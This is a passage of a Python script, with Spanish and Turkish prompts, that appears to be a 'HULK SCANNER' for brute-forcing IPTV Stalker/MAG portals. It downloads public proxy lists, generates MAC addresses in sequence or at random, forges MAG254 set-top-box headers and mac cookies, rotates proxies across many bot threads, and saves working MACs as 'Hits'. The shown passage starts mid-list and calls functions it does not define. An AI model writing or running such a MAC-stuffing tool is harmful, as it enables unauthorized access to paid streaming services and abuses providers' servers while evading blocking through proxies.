		  "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt",
		  "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
		  "https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt",
		  "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
		  "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt",
		  "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/https/https.txt",
		  "https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt",
		  "https://raw.githubusercontent.com/proxylist-to/proxy-list/main/http.txt"]
socks4=["https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all",
              "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt",
              "https://api.openproxylist.xyz/socks4.txt",
              "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt"]
socks5=["https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all",
              "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
              "https://raw.githubusercontent.com/almroot/proxylist/master/list.txt",
              "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt"]

PURPLE = '\033[95m'
CYAN = '\033[96m'
DARKCYAN = '\033[36m'
BLUE = '\033[94m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
RED = '\033[91m'
BOLD = '\033[1m'
UNDERLINE = '\033[4m'
END = '\033[0m'

v="1.0b"




os.system('cls' if os.name == 'nt' else 'clear')

def getPrList(prlist):
    prdata=[]
    for api in range(0, len(prlist)-1):
        try:
            data=requests.get(prlist[api]).text.split("\n")
            for i in data:
                if i not in prdata:
                    prdata.append(i)
        except ConnectionError:
            print("Network Error")
            return []
        except KeyboardInterrupt:
            print("Bye!")
            exit()
        except Exception as e:
            print("ERROR :\n"+str(e))
            pass
            return []
    if prdata!=[]:
        return prdata
    else:
        return []


def writeToFile(pr="", filename="proxy.txt"):
    file=open(filename,'wb')
    print(pr)
    time.sleep(10)
    file.write(bytes(pr.strip(), 'utf-8'))

def homeMenu():
    os.system("cls" if os.name == "nt" else "clear")
    print(PRL)
    print("""\n    \33[1mONLINE ELITE PROXIES!\n    \33[33m\33[1mPULSA = 0 = CONTINUA \n    \33[36m\33[1m1 =  HTTPs (Online)-[7000+]\n    \33[36m\33[1m2 =  SOCKS4 (Online)-[7500+]\n    \33[36m\33[1m3 =  SOCKS5 (Online)-[1000+]\n """)
    httpsProxy=[]
    socks4Proxy=[]
    socks5Proxy=[]
    while True:
        try:
            homeChoice=int(input(RED+"Elige tu opción:    "))
            if homeChoice==1:
                os.system("cls" if os.name == "nt" else "clear")
                print(PRL)
                print("Getting HTTP Proxies!")
                httpsProxy=getPrList(https)
                #print(httpProxy)
                print(f"Got {len(httpsProxy)} Proxies")
                time.sleep(4)
                pr=""
                for i in httpsProxy:
                    pr=pr+"\n"+i
                writeToFile(pr, rootDir+'proxy/ONLINE-HTTPs.txt')
                os.system("cls" if os.name == "nt" else "clear")
                print("Done!")
                break
            elif homeChoice==2:
                os.system("cls" if os.name == "nt" else "clear")
                print(PRL)
                print("Getting SOCKS4 Proxies!")
                socks4Proxy=getPrList(socks4)
                print(f"Got {len(socks4Proxy)} Proxies")
                time.sleep(4)
                pr=""
                for i in socks4Proxy:
                    pr=pr+"\n"+i
                writeToFile(pr, rootDir+'proxy/ONLINE-SOCKs4.txt')
                os.system("cls" if os.name == "nt" else "clear")
                print("Done!")
                break
            elif homeChoice==3:
                os.system("cls" if os.name == "nt" else "clear")
                print(PRL)
                print("Getting SOCKS5 Proxies!")
                socks5Proxy=getPrList(socks5)
                print(f"Got {len(socks5Proxy)} Proxies")
                time.sleep(4)
                pr=""
                for i in socks5Proxy:
                    pr=pr+"\n"+i
                writeToFile(pr, rootDir+'/proxy/ONLINE-SOCKs5.txt')
                os.system("cls" if os.name == "nt" else "clear")
                print("Done!")
                break				
            elif homeChoice==0:
                os.system("cls" if os.name == "nt" else "clear")
                
                break
            else:
                print("Invalid Choice! Try again.\n")
        except ValueError:
            print("Invalid Input! Try again.\n")
        except KeyboardInterrupt:
            print("Bye!")
            exit()
        except Exception as e:
            os.system("cls" if os.name == "nt" else "clear")
            print("ERROR!")
            print(e)
        
homeMenu()

print("\033[1;38;2;255;255;0m==========================================\033[0m\n")
proxi=input("""
Quieres usar Proxies?

1 - Si
2 - No

Elige 1 o 2 = """)

#print(PRL) 
if proxi =="1":
	dosyasec()
	pro=input("""
Que tipo de proxy elegiras?
	
	1 - ipVanish
	2 - Socks4 
	3 - Socks5
	4 - Http/Https

Tipo de Proxy= """)
print(proxyuz)		
botgir=input("""
Cuantos bots usaras?

Bots = """)
if botgir=="":
	botgir=1

proxysay=0

import re
pattern= "(\w{2}:\w{2}:\w{2}:\w{2}:\w{2}:\w{2})"


k=0
jj=0
iii=0
genmacs=""
bib=0
import random
def randommac():
	global genmacs,combosay
	combosay=combosay+1
	global k,jj,iii
	if randomturu == '2':
		while True:
			genmac = str(mactur)+"%02x:%02x:%02x"% ((random.randint(0, 256)),(random.randint(0, 256)),(random.randint(0, 256)))
			if not genmac in genmacs:
				genmacs=genmacs + ' '
				break
	else:
		if iii >= 257:
			iii=0
			jj=jj+1
		if jj >= 257:
			if not len(seri)==2:
				jj=0
			k=k+1
			if len(seri)==2:
				quit()
		if k==257:
			quit()
		genmac = str(mactur)+"%02x:%02x:%02x"% (k,jj,iii)
		iii=iii+1
	if serim=="1":
	   if len(seri) ==1:
	   	genmac=str(genmac).replace(str(genmac[:10]),str(mactur)+seri)
	   if len(seri)==2:
	   	genmac=str(genmac).replace(str(genmac[:11]),str(mactur)+seri)
	genmac=genmac.replace(':100',':10')
	genmac=genmac.upper()
	return genmac

import sys

def hea1(panel,mac):
	macs=mac.upper()
	macs=urllib.parse.quote(mac)
	panell=panel
	if uzmanm=="stalker_portal/server/load.php":
		panell=str(panel)+'/stalker_portal'
	data={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" ,
"Referer": http+"://"+panell+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe%2FParis;",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
	}
	if uzmanm=="stalker_portal/server/load.php":
		data={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3" ,
"Referer": http+"://"+panell+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe%2FParis;",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
		}
		
	if uzmanm=="stalker_portal/server/load.php":
		if stalker_portal=="1":
			data={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Safari/533.3" ,
"Referer": http+"://"+panell+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe%2FParis; adid=2aedad3689e60c66185a2c7febb1f918",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
			}

	return data
	
def hea2(mac,token):
	macs=mac.upper()
	macs=urllib.parse.quote(mac)
	panell=panel
	if uzmanm=="stalker_portal/server/load.php":
		panell=str(panel)+'/stalker_portal'
	data={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" ,
"Referer": http+"://"+panell+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe%2FParis;",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
"Authorization": "Bearer "+str(token),
	}
	
	if uzmanm=="stalker_portal/server/load.php":
		data={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3" ,
"Referer": http+"://"+panell+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe%2FParis;",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
"Authorization": "Bearer "+str(token),
		}
	if uzmanm=="stalker_portal/server/load.php":
		if stalker_portal=="1":
			data={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Safari/533.3" ,
"Referer": http+"://"+panell+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe%2FParis; adid=2aedad3689e60c66185a2c7febb1f918",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
"Authorization": "Bearer "+str(token),
			}
		
	return data

def month_string_to_number(ay):
    m = {
        'jan': 1,
        'feb': 2,
        'mar': 3,
        'apr':4,
         'may':5,
         'jun':6,
         'jul':7,
         'aug':8,
         'sep':9,
         'oct':10,
         'nov':11,
         'dec':12
         
        }
    s = ay.strip()[:3].lower()
    try:
        out = m[s]
        return out
    except:
        raise ValueError('Not a month')

from datetime import date
def tarih_clear(trh):
	ay=""
	gun=""
	yil=""
	trai=""
	my_date=""
	sontrh=""
	out=""
	ay=str(trh.split(' ')[0])
	gun=str(trh.split(', ')[0].split(' ')[1])
	yil=str(trh.split(', ')[1])
	ay=str(month_string_to_number(ay))
	trai=str(gun)+'/'+str(ay)+'/'+str(yil)
	my_date = str(trai)
	d = date(int(yil), int(ay), int(gun))
	sontrh = time.mktime(d.timetuple())
	out=(int((sontrh-time.time())/86400))
	return out
	
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import logging
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS="TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP"

ses=requests.Session()

combosay=0

combosay=0
def combogetir():
	combogeti=""
	global combosay
	combosay=combosay+1
	try:
		combogeti=(combototLen[combosay])
	except:pass
	return combogeti

dosyaadi=panel.replace(":","_")
hits=rootDir+'/Hits/HULK SCANNER/'
if not os.path.exists(hits):
    os.mkdir(hits)
Dosyab = hits + 'Full🎰Hits/' + panel.replace(':', '_').replace('/', '')+'.txt'
#Dosyac = hits + 'Mac🎰Hits/' + panel.replace(':', '_').replace('/', '') + '.txt'
DosyaA = hits + 'Mini🎰Hits/' + panel.replace(':', '_').replace('/', '')+ '.txt'


def proxygetir():
	if proxi =="1":
		global proxysay,bib
		bib=bib+1
		bekle(bib,"PRLHits")
		if bib==15:
			bib=0
		while True:
			try:
				proxysay=proxysay+1
				if proxysay==proxyuz:
					proxysay=0
				
				proxygeti=(proxytotLen[proxysay])
				pveri=proxygeti.replace('\n','')
				
				pip=pveri.split(':')[0]
				pport=pveri.split(':')[1]
				
				if pro=="1":
					pname=pveri.split(':')[2]
					ppass=pveri.split(':')[3]
					proxies={'http':'socks5://'+pname+':'+ppass+'@'+pip+':'+pport,'https':'socks5://'+pname+':'+ppass+'@'+pip+':'+pport}
				if pro=="2":
					proxies={'http':'socks4://'+pip+':'+pport,'https':'socks4://'+pip+':'+pport}
				if pro=="3":
					proxies={'http':'socks5://'+pip+':'+pport,'https':'socks5://'+pip+':'+pport}
				if pro=="4":
					proxies={'http':'http://'+pip+':'+pport,'https':'https://'+pip+':'+pport}
				break
			except:pass
	else:
		proxies=""
	return proxies


import threading
for PRLHits in range(int(botgir)):
	PRLHits = threading.Thread(target=XD)
	PRLHits.start()
	
